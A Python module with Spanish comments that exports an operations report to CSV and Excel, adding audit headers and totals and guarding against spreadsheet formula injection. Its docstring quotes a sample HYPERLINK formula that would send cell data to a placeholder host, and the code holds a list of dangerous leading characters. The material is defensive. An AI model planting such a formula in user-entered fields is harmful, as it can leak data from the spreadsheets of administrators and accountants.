"""
services/reportes_export.py — El reporte, como archivo.

DOS COSAS QUE UN REPORTE DESCARGADO TIENE QUE TENER

1. UN ENCABEZADO QUE DIGA QUE ES
   Dos archivos llamados `reporte.csv` en la misma carpeta son
   indistinguibles. Cada archivo que sale de acá lleva arriba: qué periodo
   cubre, en qué huso se cortó el día, qué filtros se aplicaron, cuándo se
   generó y quién lo pidió. Sin eso, un reporte no se puede auditar ni cuadrar
   contra otro.

2. LOS MISMOS TOTALES QUE LA PANTALLA
   El archivo trae el bloque de totales del periodo ENTERO. Si alguien suma la
   columna en Excel y no le da con el encabezado, sabe inmediatamente que le
   falta algo — en vez de creerse un número incompleto.

LA INYECCION DE FORMULAS NO ES UN DETALLE
   Los nombres, los beneficiarios y los documentos los escribe gente. Excel y
   LibreOffice interpretan como FORMULA cualquier celda que empiece con `=`,
   `+`, `-`, `@`, tabulador o retorno de carro. Un usuario que se registra como

       =HYPERLINK("http://x.com?"&A1,"Cobrar aqui")

   consigue que su fila se convierta en un enlace ejecutable en la planilla del
   administrador. Y como esa planilla es la que va a contabilidad, el objetivo
   no es hipotético.

   `_neutralizar` le antepone un apóstrofo a cualquier celda que empiece con uno
   de esos caracteres. Es lo que recomienda OWASP, se ve igual en pantalla, y no
   cambia el texto de los campos que no son peligrosos.
"""

import csv
import io
import logging
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

# Los caracteres con los que una celda se vuelve una formula al abrirla.
PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")

COLUMNAS = [
    ("fecha", "Fecha"),
    ("flujo", "Flujo"),
    ("referencia", "Referencia"),
    ("usuario", "Usuario"),
    ("email", "Email"),
    ("contraparte", "Contraparte"),
    ("documento", "Documento"),
    ("destino", "Cuenta / destino"),
    ("monto_origen", "Monto origen"),
    ("unidad_origen", "Unidad"),
    ("monto_destino", "Monto destino"),
    ("unidad_destino", "Unidad"),
    ("tasa", "Tasa"),
    ("operador", "Procesado por"),
    ("comprobante", "Comprobante"),
]


def _neutralizar(valor) -> str:
    """El valor como texto, incapaz de volverse una fórmula.

    Se antepone un apóstrofo, que es lo que recomienda OWASP: la planilla lo
    trata como marca de texto, no lo muestra en la celda, y el resto de los
    valores queda intacto.
    """
    if valor is None:
        return ""
    if isinstance(valor, bool):
        return "sí" if valor else "no"
    texto = str(valor)
    return f"'{texto}" if texto[:1] in PELIGROSOS else texto


def _encabezado(reporte: dict, pedido_por: str) -> list:
    """Las líneas de contexto que van arriba de la tabla."""
    criterios = reporte.get("criterios") or {}
    tz = criterios.get("tz_min") or 0
    signo = "+" if tz >= 0 else "-"
    huso = f"UTC{signo}{abs(tz) // 60:02d}:{abs(tz) % 60:02d}"

    lineas = [
        ["RIS App — Reporte de operaciones"],
        ["Periodo", f"{criterios.get('desde')} a {criterios.get('hasta')}"],
        # El huso NO es cosmético: define dónde corta el día. Dos reportes del
        # mismo periodo en husos distintos no cuadran, y sin esta línea nadie
        # puede saber por qué.
        ["Huso horario del corte", huso],
        ["Flujos incluidos", ", ".join(criterios.get("flujos") or [])],
    ]
    if criterios.get("buscar"):
        lineas.append(["Búsqueda", criterios["buscar"]])
    if criterios.get("operador"):
        lineas.append(["Procesado por", criterios["operador"]])
    if criterios.get("monto_min") is not None:
        lineas.append(["Monto mínimo", criterios["monto_min"]])
    if criterios.get("monto_max") is not None:
        lineas.append(["Monto máximo", criterios["monto_max"]])

    lineas += [
        ["Generado", datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")],
        ["Pedido por", pedido_por or "—"],
        ["Operaciones", reporte.get("operaciones", 0)],
    ]
    if reporte.get("truncado"):
        # Si se truncó, se dice ACÁ ARRIBA y no en una nota al pie: un total
        # incompleto que parece completo es la forma más cara de equivocarse.
        lineas.append(["ATENCIÓN",
                       "El periodo superó el tope de lectura: estos números están "
                       "INCOMPLETOS. Pedí el reporte en tramos más cortos."])
    lineas.append([])

    lineas.append(["TOTALES POR FLUJO"])
    lineas.append(["Flujo", "Operaciones", "Total origen", "Unidad",
                   "Total destino", "Unidad"])
    for flujo, t in (reporte.get("totales") or {}).items():
        lineas.append([flujo, t["operaciones"], t["total_origen"], t["unidad_origen"],
                       t["total_destino"], t["unidad_destino"]])
    lineas.append([])
    return lineas


def a_csv(reporte: dict, pedido_por: str = "") -> str:
    """El reporte como CSV, listo para Excel."""
    buffer = io.StringIO()
    # El BOM es lo que hace que Excel respete los acentos al abrir el archivo
    # con doble clic. Sin él, «José» se ve «JosÃ©».
    buffer.write("﻿")
    escritor = csv.writer(buffer, lineterminator="\r\n")

    for linea in _encabezado(reporte, pedido_por):
        escritor.writerow([_neutralizar(c) for c in linea])

    escritor.writerow([titulo for _, titulo in COLUMNAS])
    for fila in reporte.get("filas") or []:
        escritor.writerow([_neutralizar(fila.get(clave)) for clave, _ in COLUMNAS])

    return buffer.getvalue()


def a_xlsx(reporte: dict, pedido_por: str = "") -> bytes:
    """El reporte como planilla, con los montos como NÚMEROS.

    La diferencia con el CSV no es estética. En un CSV todo es texto: quien lo
    abre tiene que convertir la columna a número para poder sumarla, y ahí es
    donde el punto decimal se vuelve separador de miles y un total de 1.234,50
    pasa a ser 123.450. Acá los montos van tipados y ya se pueden sumar.
    """
    from openpyxl import Workbook
    from openpyxl.styles import Alignment, Font, PatternFill
    from openpyxl.utils import get_column_letter

    libro = Workbook()
    hoja = libro.active
    hoja.title = "Operaciones"

    negrita = Font(bold=True)
    encabezado_fondo = PatternFill("solid", fgColor="1F2937")
    encabezado_letra = Font(bold=True, color="FFFFFF")

    fila_actual = 1
    for linea in _encabezado(reporte, pedido_por):
        for columna, valor in enumerate(linea, start=1):
            celda = hoja.cell(row=fila_actual, column=columna)
            celda.value = _neutralizar(valor)
            if columna == 1:
                celda.font = negrita
        fila_actual += 1

    cabecera = fila_actual
    for columna, (_, titulo) in enumerate(COLUMNAS, start=1):
        celda = hoja.cell(row=cabecera, column=columna, value=titulo)
        celda.fill = encabezado_fondo
        celda.font = encabezado_letra
        celda.alignment = Alignment(horizontal="center")
    fila_actual += 1

    numericas = {"monto_origen", "monto_destino", "tasa"}
    for fila in reporte.get("filas") or []:
        for columna, (clave, _) in enumerate(COLUMNAS, start=1):
            celda = hoja.cell(row=fila_actual, column=columna)
            valor = fila.get(clave)
            if clave in numericas and valor not in (None, ""):
                try:
                    celda.value = float(valor)
                    celda.number_format = "#,##0.00"
                    continue
                except (TypeError, ValueError):
                    pass          # cae al texto neutralizado de abajo
            celda.value = _neutralizar(valor)
        fila_actual += 1

    # Anchos legibles y la cabecera fijada, para que al bajar por mil filas se
    # siga sabiendo qué columna se está mirando.
    anchos = {"fecha": 17, "flujo": 20, "referencia": 16, "usuario": 24,
              "email": 26, "contraparte": 24, "documento": 16, "destino": 24}
    for columna, (clave, titulo) in enumerate(COLUMNAS, start=1):
        hoja.column_dimensions[get_column_letter(columna)].width = anchos.get(
            clave, max(12, len(titulo) + 2))
    hoja.freeze_panes = hoja.cell(row=cabecera + 1, column=1)

    salida = io.BytesIO()
    libro.save(salida)
    return salida.getvalue()


def nombre_de_archivo(reporte: dict, extension: str) -> str:
    criterios = reporte.get("criterios") or {}
    return (f"risapp_reporte_{criterios.get('desde')}_a_"
            f"{criterios.get('hasta')}.{extension}")
